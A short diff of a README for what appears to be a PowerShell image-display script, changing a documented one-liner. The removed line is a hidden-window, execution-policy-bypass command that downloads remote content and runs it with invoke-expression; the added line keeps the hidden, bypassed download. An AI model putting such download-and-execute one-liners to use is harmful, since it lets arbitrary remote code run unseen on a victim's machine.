@@ -41,7 +41,7 @@ These images look significantly cleaner due to the fact they were drawn and code
 * Invoke-WebRequest will be used to download the image 
 
 ```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
+powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1
 ```
 * The image will be converted into a BMP file
 * An algorithm will be used to find the closest matching colors available in the powershell window
